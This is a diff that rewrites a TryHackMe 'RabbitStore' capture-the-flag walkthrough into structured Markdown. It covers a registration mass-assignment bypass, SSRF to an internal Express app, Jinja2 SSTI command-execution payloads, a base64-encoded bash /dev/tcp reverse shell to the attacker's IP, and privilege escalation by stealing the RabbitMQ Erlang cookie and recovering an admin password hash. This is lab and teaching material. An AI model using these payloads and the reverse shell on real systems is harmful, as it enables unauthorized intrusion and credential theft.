@@ -1,233 +1,319 @@
-hello this is a medium box
+# TryHackMe — RabbitStore (Medium) Walkthrough
 
-title = rabbitstore
-medium from tryhackme
+> Room: **RabbitStore** (Medium)  
+> Goal: Get initial access, then escalate to root.
 
+---
 
-like usually we gonna do  nmap scan to see which service are running on the target machine
+## 1) Recon
 
+### 1.1 Port scan (Nmap)
 
-command = nmap -p- -sC -sV -T4 --min-rate=1000 <IP_ADDRESS>
--p- : scan all ports from 1 to 65535
--sC : run default nmap scripts
--sV : detect service versions
--T4 : faster timing template
---min-rate=1000 : send at least 1000 packets per second to speed up
+Run a full TCP scan with default scripts + version detection:
 
+```/dev/null#L1-1
+nmap -p- -sC -sV -T4 --min-rate=1000 <IP_ADDRESS>
+```
 
-while the nmap is running i try to acces the web page but i get a error maybe i should had the host to the host file first the name is cloudsite.thm and this way the DNS is gonna resolve the IP address to the hostname and i can access the web page
+**Flags used**
+- `-p-`: scan all ports (1–65535)
+- `-sC`: run default Nmap scripts
+- `-sV`: detect service versions
+- `-T4`: faster timing template
+- `--min-rate=1000`: send at least 1000 packets/sec
 
-i try to access the login page but not resolve too i need to add storage.cloudite.thm to the host file too and then i can access the login page but i dont have any credentials so i need to find another way to access the machine
+### 1.2 Results (important ports)
 
+The scan shows:
 
-we have the result of nmap = 
+- `22/tcp` — SSH (OpenSSH 8.9p1)
+- `80/tcp` — HTTP (Apache 2.4.52) redirecting to `http://cloudsite.thm/`
+- `4369/tcp` — `epmd` (Erlang Port Mapper Daemon)
+- `25672/tcp` — RabbitMQ-related (Erlang distribution / RabbitMQ node comms)
 
-22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
-|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
-80/tcp    open  http    Apache httpd 2.4.52
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-|_http-title: Did not follow redirect to http://cloudsite.thm/
-4369/tcp  open  epmd    Erlang Port Mapper Daemon
-| epmd-info: 
-|   epmd_port: 4369
-|   nodes: 
-|_    rabbit: 25672
-25672/tcp open  unknown
-Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+**Takeaway:** Besides web + SSH, the presence of `epmd` + RabbitMQ ports suggests an Erlang/RabbitMQ angle for privilege escalation later.
 
+---
 
-like u see we have port 22 running ssh, port 80 running apache and we have port 4369 running epmd which is used by erlang and we have port 25672 which is used by rabbitmq so maybe we can find some vulnerabilities in these services to access the machine
+## 2) Web access (fix DNS / hosts)
 
+When browsing the site initially, pages failed to resolve because the app expects hostnames.
 
-so there s a login form in there i try to log as a normal user and it says i have to be subscribed or somethings like that to be able to do any action i see that the token is a jwt token so i try to decrypt it using some tool and there s a subscription field in it i craft the token but didn t get any result so i bring the registred form to burpsuite and then send a request to registre and weird there s only the password and email that is send and no subscription field so maybe i can add a subscription field active to the request to see if it work and it work i can see a upload form i don t know where we going in this but anyway
+Add these entries to your `/etc/hosts` on your attacking machine:
 
-it says upload from localhost
-i try uploading a file to see what s going on and nothing really interesting just he gives the url of the file inside uploads enpoint
+```/dev/null#L1-3
+<TARGET_IP> cloudsite.thm
+<TARGET_IP> storage.cloudsite.thm
+```
 
+Then visit:
+- `http://cloudsite.thm/`
+- `http://storage.cloudsite.thm/`
 
-i try to fuzz the api endpoint to see what we have
+---
 
+## 3) Auth bypass via registration request manipulation (JWT / subscription)
 
-command = dirbuster -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
+### 3.1 Observing the behavior
 
-/Login                (Status: 405) [Size: 36]
-/docs                 (Status: 403) [Size: 27]
-/login                (Status: 405) [Size: 36]
-/register             (Status: 405) [Size: 36]
-/uploads              (Status: 401) [Size: 32]
-Progress: 4751 / 4751 (100.00%)
+The app has a login form, but a normal login doesn’t allow actions; it complains you need to be “subscribed”.
 
+A JWT is used (cookie named `jwt`). The token contains a `subscription` field.
 
-not really interesting again but maybe we need those after 
+### 3.2 Finding the weakness
 
-i m gonnaf focus on a vuln that maybe interesting a SSRF 
+Instead of trying to forge the JWT directly, intercept the **registration** request in Burp Suite.
 
-what is a ssrf ? it s a Server Side Request Forgery is a vulnerability that allows an attacker to make requests from the server to internal or external resources. This can be used to access sensitive information, perform actions on behalf of the server, or even pivot to other systems within the network.
+The registration request only sends:
+- `email`
+- `password`
 
-just do some research and you ll understand
+No `subscription` field is present.
 
+### 3.3 Exploit: add `subscription=active`
 
-so first i try to download something from my computer using my ip to download a test.txt that i create using the upload from url and i work i can download somthings now let s try to direct the request to the internal server to see if we can access somethings
+Modify the registration request by adding:
 
+- `"subscription": "active"`
 
-changing the url to http://localhost to point to the server
+If the server accepts it, your newly created user is treated as subscribed and you gain access to additional functionality (including an upload-from-URL feature).
 
-and weirdly a url of the content just appear
-and it s the html page of the web we ll try to access more
+---
 
-then i try to upload the docs on localhost:3000 cause that where expressjs run on some app
+## 4) Upload-from-URL → SSRF
 
-and we find another endpoint /api/fetch_messeges_from_chatbot
+### 4.1 What you have
 
+After becoming “active”, you get a feature that uploads content **from a URL** and then returns a link under an `/uploads` endpoint.
 
-i bring it to burpsuite and send a post request it says username required so i add a username and the endpoint mention that the chat bot ain t disponible yet that logics but let s see if i put 
+This is a classic place to test for **SSRF (Server-Side Request Forgery)**.
 
+> SSRF allows you to make the server perform HTTP requests to internal services (localhost / internal ports), potentially exposing internal admin apps, metadata services, or other sensitive endpoints.
 
-{{3*3}} in the username field and send the request it says 9 so maybe there is some kind of code execution here and maybe we can use it to access the machine
+### 4.2 Confirm SSRF with your attacker machine
 
+Host a simple file (example: `test.txt`) on your machine and provide your URL to the upload-from-URL feature.  
+If you receive a working uploaded link back, SSRF-style fetching works.
 
-and unfortunately it return 9 which is good to us cause it executed 3*3
+### 4.3 Pivot SSRF to localhost
 
+Change the supplied URL to point to the target’s localhost:
 
-req = POST /api/fetch_messeges_from_chatbot HTTP/1.1
+- `http://localhost/`
+
+If it returns HTML content from the local web service, you have confirmed you can reach internal services.
+
+### 4.4 Finding internal app ports
+
+Try common internal web ports. In this box, checking `localhost:3000` is useful (common for Express apps).
+
+By fetching internal content from `http://localhost:3000`, you can discover new endpoints, including:
+
+- `/api/fetch_messeges_from_chatbot`
+
+(Spelling matches the target endpoint name.)
+
+---
+
+## 5) SSTI in `/api/fetch_messeges_from_chatbot` → RCE
+
+### 5.1 Endpoint behavior
+
+Send a request to the endpoint. It requires a `username` parameter. Example request:
+
+```/dev/null/request.txt#L1-18
+POST /api/fetch_messeges_from_chatbot HTTP/1.1
 Host: storage.cloudsite.thm
-Content-Length: 29
-Accept-Language: en-US,en;q=0.9
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
 Content-Type: application/json
-Accept: */*
-Origin: http://storage.cloudsite.thm
-Referer: http://storage.cloudsite.thm/dashboard/active
-Accept-Encoding: gzip, deflate, br
-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3Q0QGdtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTcwNTE3NCwiZXhwIjoxNzcxNzA4Nzc0fQ.oq4f5esXqkumgJWsohMvE0BmNXFae-tX4BWL8aFqMiQ
-Connection: keep-alive
+Cookie: jwt=<YOUR_JWT>
+Connection: close
 
-{
-	"username":"{{3*3}}"
+{"username":"test"}
+```
 
-}
+The page responds indicating the chatbot is under development.
 
-res = HTTP/1.1 200 OK
-Date: Sat, 21 Feb 2026 20:30:42 GMT
-Server: Apache/2.4.52 (Ubuntu)
-X-Powered-By: Express
-Content-Type: text/html; charset=utf-8
-ETag: W/"118-KbukWB/+AsgrN6hC3i9r1vFGM3E-gzip"
-Vary: Accept-Encoding
-Content-Length: 280
-Keep-Alive: timeout=5, max=100
-Connection: Keep-Alive
+### 5.2 Test for template injection
 
-<!DOCTYPE html>
-<html lang="en">
- <head>
-   <meta charset="UTF-8">
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-       <title>Greeting</title>
- </head>
- <body>
-   <h1>Sorry, 9, our chatbot server is currently under development.</h1>
- </body>
-</html>
+Try a simple expression payload:
 
+```/dev/null#L1-1
+{"username":"{{3*3}}"}
+```
 
-now we need to find a shell
+If the response includes `9`, the input is being evaluated server-side, consistent with **SSTI** (likely Jinja2-style).
 
-After confirming the SSTI vulnerability, I searched for Jinja2 Remote Code Execution (RCE) techniques to escalate my access.
+### 5.3 Escalate SSTI → command execution
 
+A known Jinja2-style payload for command execution is:
 
-we ll use this 
+```/dev/null#L1-1
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
 
-we need to encode bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1 in base64 and then use the following payload to execute it on the server
+If that returns command output, you have RCE.
 
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <encoded_payload> |base64 -d |bash').read() }}
+---
 
+## 6) Get a reverse shell
 
-and we have a shell just upgrade shell using python3 -c 'import pty; pty.spawn("/bin/bash")' or 
+### 6.1 Prepare your listener
 
+On your attacking machine:
 
-controle Z stty raw -echo ;fg
+```/dev/null#L1-1
+nc -lvnp 4444
+```
 
-export TERM = xterm
- and a stable shell
+### 6.2 Use a base64-encoded bash reverse shell
 
+Encode this (replace `<YOUR_IP>` and port as needed):
 
-and we have the user flag to in the azrael directory
-i have a shell so first i uploaded linpeas to see how to escalate privilege
+```/dev/null#L1-1
+bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
+```
 
+Then send the payload through SSTI using `os.popen`, decoding and executing:
 
-## Privilege Escalation via RabbitMQ / Erlang (EPMD)
+```/dev/null#L1-1
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <BASE64_PAYLOAD> | base64 -d | bash').read() }}
+```
 
-During enumeration (ex: `linpeas`), you may notice RabbitMQ’s Erlang services are reachable in a way that shouldn’t be exposed. RabbitMQ nodes authenticate with an **Erlang cookie**; if you can obtain that cookie, you can use admin tools (like `rabbitmqctl`) to query the broker and potentially recover credentials / escalate.
+Once it connects back, you should have a shell as the low-privilege user (in this box, that user is `azrael`).
 
-### 1) Why this matters (what you’re looking at)
-RabbitMQ is built on Erlang and nodes communicate using `epmd` (Erlang Port Mapper Daemon) and the Erlang distribution ports. If you can authenticate as the RabbitMQ node (using the same cookie), you can run queries against the broker as if you were the node itself.
+---
 
-Key idea:
-- **Cookie = shared secret** used to authenticate Erlang distribution connections.
-- If you have the cookie for the RabbitMQ node, `rabbitmqctl` can talk to that node remotely.
+## 7) Stabilize your shell
 
-### 2) Add host mapping (so the node name resolves correctly)
-RabbitMQ nodes are named like `rabbit@forge`. The `forge` part must resolve on your attacking machine.
+Common upgrades (pick one):
 
-Add to `/etc/hosts` on your attacking machine:
-- `<TARGET_IP> forge`
+### Option A: Python PTY
 
-(Use the machine’s IP for `<TARGET_IP>`.)
+```/dev/null#L1-1
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-### 3) Obtain the Erlang cookie from the compromised machine
-On the target (as the low-priv user, here it was `azrael`), find the Erlang cookie.
+### Option B: `stty` trick
 
-Common locations:
+1. Background the shell:
+```/dev/null#L1-1
+Ctrl+Z
+```
+
+2. Fix your local terminal:
+```/dev/null#L1-1
+stty raw -echo; fg
+```
+
+3. Set terminal type:
+```/dev/null#L1-1
+export TERM=xterm
+```
+
+---
+
+## 8) User flag
+
+After landing a shell, locate the user flag. In this box it is located in:
+
+- `/home/azrael/`
+
+---
+
+## 9) Privilege escalation: RabbitMQ / Erlang cookie (EPMD)
+
+During enumeration (e.g., with `linpeas`), you may notice RabbitMQ’s Erlang services are reachable. RabbitMQ nodes authenticate using a shared secret called the **Erlang cookie**. If you can obtain the cookie, you can query/manage the node using RabbitMQ tooling.
+
+### 9.1 Why this matters
+
+RabbitMQ is built on Erlang distribution:
+- `epmd` helps locate Erlang nodes
+- nodes authenticate with the **cookie**
+- if you have the correct cookie + node name resolves, you can run administrative queries
+
+Key point:
+- **Cookie = shared secret** for Erlang distribution authentication.
+
+### 9.2 Ensure the node name resolves (attacker machine)
+
+RabbitMQ nodes often look like `rabbit@forge`. The hostname portion (`forge`) must resolve.
+
+Add to your attacker `/etc/hosts`:
+
+```/dev/null#L1-1
+<TARGET_IP> forge
+```
+
+### 9.3 Find the Erlang cookie on the target
+
+On the compromised machine, check common cookie locations:
+
 - `~/.erlang.cookie`
-- `/var/lib/rabbitmq/.erlang.cookie`  (often the RabbitMQ system user)
-- `/root/.erlang.cookie` (if readable, usually not)
+- `/var/lib/rabbitmq/.erlang.cookie`
+- `/root/.erlang.cookie` (usually not readable)
 
-You must use **the cookie that matches the RabbitMQ node** you’re trying to manage.
+You need the cookie that corresponds to the RabbitMQ node you want to query (commonly the rabbitmq service user’s cookie).
 
-### 4) Install / use `rabbitmqctl` and query the remote node
-On your attacking machine (or from the target if it has the tooling), install `rabbitmqctl` and run it against the node:
+### 9.4 Query the RabbitMQ node with `rabbitmqctl`
 
-- Node: `rabbit@forge`
-- Cookie: the value you found in the `.erlang.cookie`
+From a machine that has `rabbitmqctl` available (attacker machine, or target if present), query the node. Example:
 
-Example command:
-- `sudo rabbitmqctl --erlang-cookie 'YOUR_COOKIE_HERE' --node rabbit@forge list_users`
+```/dev/null#L1-1
+sudo rabbitmqctl --erlang-cookie 'YOUR_COOKIE_HERE' --node rabbit@forge list_users
+```
 
-This should return the RabbitMQ users. In this box, you see an **administrator** account and a value that looks like a password hash.
+This should list RabbitMQ users. In this box, you should find an administrator account and a value that looks like a password hash (often base64-encoded data).
 
-### 5) Understanding the RabbitMQ “hash” output (this is where people get lost)
-RabbitMQ can store a password hash in a format that looks like a base64 blob. Conceptually it is:
+---
+
+## 10) Understanding the RabbitMQ password hash format
+
+RabbitMQ can store password hashes in a format that looks like a base64 blob. Conceptually:
 
 - `base64( salt(4 bytes) + sha256( salt(4 bytes) + password ) )`
 
-So the base64 string contains:
-1) **First 4 bytes**: the salt
-2) **Remaining bytes**: the SHA-256 digest
+So when you base64-decode the stored value, the resulting bytes are:
 
-Important:
-- You are NOT directly “cracking SHA-256” here by cutting out a piece.
-- The simplest path in this box is that the stored “hash” is actually enough to reconstruct/identify the password used in the intended workflow (depending on how the challenge is set up), or the password is weak enough to crack once you extract the salt correctly.
+1. First **4 bytes**: salt  
+2. Remaining bytes: SHA-256 digest
 
-### 6) Extract the salt (first 4 bytes) from the base64 blob
-If you saved the base64 blob into `password.txt`, you can decode it, then read the first 4 bytes:
+### 10.1 Extract the salt (first 4 bytes)
 
-- `cat password.txt | base64 -d | xxd -p -c 100`
+If you saved the base64 blob into `password.txt`:
 
-This prints the decoded bytes as hex. The **first 8 hex chars** correspond to the 4-byte salt.
+```/dev/null#L1-1
+cat password.txt | base64 -d | xxd -p -c 100
+```
 
-(If you only do `cut -c-9`, you’ll accidentally include an extra character. The salt is 8 hex chars, so you want the first 8.)
+This prints decoded bytes in hex. The salt is the first 4 bytes = first **8 hex characters**.
 
 Example (conceptual):
 - decoded hex: `a1b2c3d4<rest_of_digest...>`
 - salt hex: `a1b2c3d4`
 
-From here, you can proceed with the intended method for the box to recover the password (ex: using a small script or cracking approach that re-computes `sha256(salt+password)` and compares).
+From here you can follow the intended path for the room to recover the password (commonly by recomputing the hash for guesses and comparing, or by using a small script with a wordlist if the password is weak).
 
-### 7) Switch to root and grab the flag
+---
+
+## 11) Become root
+
 Once you recover the administrator/root password:
-- `su root`
-- enter the recovered password
-- read `root.txt`
+
+```/dev/null#L1-2
+su root
+# enter recovered password
+```
+
+Then read the root flag:
+
+- `/root/root.txt`
+
+---
+
+## 12) Notes / reminders
+
+- Hostnames matter in this room (`cloudsite.thm`, `storage.cloudsite.thm`, and later `forge`).
+- The initial foothold comes from chaining **SSRF → internal endpoint discovery → SSTI → RCE**.
+- The privilege escalation path leverages **RabbitMQ/Erlang cookie authentication** to extract credentials.
+
+---
